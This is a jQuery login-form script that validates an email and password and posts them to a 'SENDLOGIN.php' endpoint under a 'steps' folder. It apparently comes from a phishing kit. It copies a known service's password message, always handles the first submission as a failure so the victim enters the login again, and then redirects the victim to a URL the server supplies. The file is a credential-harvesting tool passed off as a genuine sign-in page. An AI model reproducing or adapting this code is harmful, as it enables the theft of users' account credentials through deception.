$(document).ready(function () {
	
	/**$("#password").keyup(function(){
		
		var lenthID = $("#password").val().length;
		if(lenthID < 7 ){
			
			$('.haseError').css({
				borderColor : 'red' 
			});
		}
		else {
			
			$('.haseError').css({
				borderColor : '#b3b3b3' 
			});
			
		}
		
	})**/
	
	$(".email").keyup(function(){
	
		$(".msgMail").addClass("hiddens");

			$('.emailHaseError').css({
				borderColor : '#b3b3b3' 
			});	

	
	});
	
	$(".pass").keyup(function(){
	
		$(".msgPass").addClass("hiddens");

			$('.passlHaseError').css({
				borderColor : '#b3b3b3' 
			});	

	
	});
	
	
	
	
	
    function ValidateEmail(email) {
        var expr = /^([\w-\.]+)@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.)|(([\w-]+\.)+))([a-zA-Z]{2,4}|[0-9]{1,3})(\]?)$/;
        return expr.test(email);
    };
	
    $('#loginbtn').click(function () {
		
        if (!ValidateEmail($(".email").val())) {
			$(".msgMail").text("Please enter a valid email.");
            $(".msgMail").removeClass("hiddens");
	
				$('.emailHaseError').css({
					borderColor : 'red' 
				});	
			
        }
        else {
            
        	
		
		var pass = $('.pass').val();	
		
		if(pass == '' || pass.length < 5 ){
			$(".msgPass").text("Your password must contain between 4 and 60 characters.");
            $(".msgPass").removeClass("hiddens");
				$('.passlHaseError').css({
					borderColor : 'red' 
				});	
		}
		else {
			
		
		
        var data = $('.loginForm').serialize();
        $.ajax({
            type: 'post',
            url: 'system/steps/functions/SENDLOGIN.php',
            data: data,
			beforeSend: function(){
				$("#loading").removeClass("hidden");
			},
            success: function (response) {
				
				
				if($("#stlogin").val() == 0){
					$("#stlogin").val(response);
					$(".ui-message-container").removeClass("hidden");
					
					$("#loading").addClass("hidden");
				}
				else {
					
					location.href=""+response+"";
					
				}
				
					
            }
        });
		}
		}	
        return false;
    });
});


